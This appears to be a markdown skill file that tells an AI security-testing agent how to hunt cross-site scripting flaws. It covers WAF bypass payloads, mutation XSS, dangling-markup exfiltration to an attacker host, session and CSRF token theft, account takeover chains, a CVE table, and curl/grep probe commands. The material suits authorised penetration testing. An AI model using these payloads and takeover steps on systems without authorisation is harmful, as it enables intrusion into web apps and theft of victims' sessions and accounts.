---
name: xss
description: >-
  XSS hunting — reflected/stored/DOM/mutation, CSP & WAF escapes, session theft, admin
  actions, ATO chains. Auto-invoke when: input echoed without `<`/`"` encoding, JS bundles
  show unsafe sinks (innerHTML/eval/document.write/location), message listeners accept data,
  template metachars echo in SPA responses. Do NOT load for: template engines evaluating
  server-side → use `ssti`; cross-origin messaging → use `postmessage`.
family: differential
severity: medium → critical
---

# XSS — reflected · stored · DOM · mutation · CSP escape

> **Arsenal:** execute JS in victims' browsers → session/token/CSRF theft, keylogging, ATO.
> **Sibling:** `postmessage` (message-origin gaps), `cors` (credentialed read), `ssti`
> (server-side template evaluation), `open_redirect` (pre-XSS chain aid).
> **Proof bar:** payload executes (callback fired / state changed) in a victim-context
> browser — not merely echoed. DOM sinks: prove a controllable-source→sink path executes.
> **Setup:** two identities help for stored XSS (A stores, B triggers); else one browser
> profile as the victim.

## WAF Bypass (XSS)
- Case: `<ScRiPt>` `OnErRoR=` · delimiter injection: `<svg\nonload>` newline/tab between tag and attr
- Encoding: `\u003c`, `\x3c`, `&#x3c;`, double-encoding `%253C` (WAF decodes once, app twice), unicode fullwidth
- Context escape first: `'`/`"`/`</script>`/backtick depending on sink; then payload
- Filtered tag/attr rebuild: allowed-tags union (`<img><svg><video>`), events list, `javascript:` via `java\nscript:`
- Mutable: mutation XSS (mXSS) — payload survives sanitizer round-trip (DOMPurify bypass history)
- Parser differentials: `<>` vs `<>`, `<!--` dangling markup, `</textarea><script>`, `</title>`
- CSP: dangling markup exfil (`<img src=x onerror>`) → `meta refresh` → JSONP/CSP gadgets (Angular, Vue, jQuery `$.getScript`, `script-src` wildcard hosts)

## Context
- Sink = where input lands: HTML body, attribute, JS string, URL, CSS. Classification FIRST,
  payload last. Send benign marker `zzx<"'>` — observe raw/stripped/encoded → branch.
- Three classes: reflected (no persistence), stored (persists, fires for other victims),
  DOM (source = location.hash/postMessage/storage; never touches server).

## General Techniques
- **Reflected:** confirm echo point + context, then class payload (tag→attr→JS→URL→CSS)
- **Stored:** store in profile/comment/upload-name/CSV → trigger in admin panel (second sink)
- **DOM:** source audit from JS (`location`, `document.referrer`, `postMessage` data, `storage`) → sink (`innerHTML`, `eval`, `document.write`, `location.assign`, `setAttribute`, `outerHTML`)
- **postMessage-to-DOM:** listener validates origin poorly → feed payload via attacker iframe
- **JSONP/XSSI:** `?callback=alert` — callback name reflection without sanitization
- **Dangling markup:** `<img src='//attacker/?` + `'` — steal CSRF tokens across CSP
- **Mutation XSS:** `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` round-trip
- **CSS injection:** `url(javascript:…)` legacy / expression() IE / data: exfil in style sinks
- **Angular `{{}}`/Vue `{{7*7}}` CSTI** when template expressions on client side — NOT ssti (server) — XSS-class impact

## Second-Order & Bypass Techniques
- Filename/username/CSV-cell stored → rendered unencoded in export/list views (CSV formula injection → RCE on admin's Excel)
- Sanitizer bypass: allowed tag + allowed event union, namespace tricks `<svg><a xlink:href=javascript:>`
- `javascript:` inside `href`/`action` where scheme filtered but `java%0ascript:` slips

## Auth Bypass Techniques
- Steal session cookie (HttpOnly=off) → replay · steal CSRF → act as victim · XSS inside
  admin context → create admin user / disable 2FA / read secrets

## Header Techniques
- Reflected User-Agent/Referer/XFF in logs/error pages rendered without encoding
- `Content-Security-Policy` audit: `unsafe-inline`, missing object-src, wp-admin JSONP, wildcard script hosts

## CVE on Sight
| CVE | Surface | Class |
|---|---|---|
| CVE-2020-7071/7070 | jQuery < 3.5.0 | htmlPrefilter XSS |
| CVE-2019-10744 | lodash < 4.17.12 | template XSS |
| CVE-2017-18088 | WordPress 4.9 | MediaElement XSS |
| CVE-2023-29489 | cPanel 11.x | XSS RCE chain |
| CVE-2020-15366 (EWC) | Ajax Load More WP plugin | stored XSS RCE-chain |

## Indicators — record as `possible` when seen
- Echoed input WITHOUT `<`/`"` encoding (raw reflection) · `document.write`/`innerHTML`/`eval` in bundles
- `onmessage` listeners + DOM writes · CSP headers using `unsafe-inline`/`*` sources
- Template `{{7*7}}` echo (client-side unless server evaluates) · URL fragment used by app JS

## Tools
- `curl -s URL?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E | grep -o '<script>alert(1)</script>'` — echo proof
- `grep -nE '(innerHTML|outerHTML|eval\(|document.write|insertAdjacentHTML|location\.(href|assign)|setAttribute)' js/
- XSStrike / dalfox for sink-level triage (confirm by hand); browser devtools for DOM sources
- Burp + `Data: <script>alert(document.domain)</script>` in every POST to find stored sinks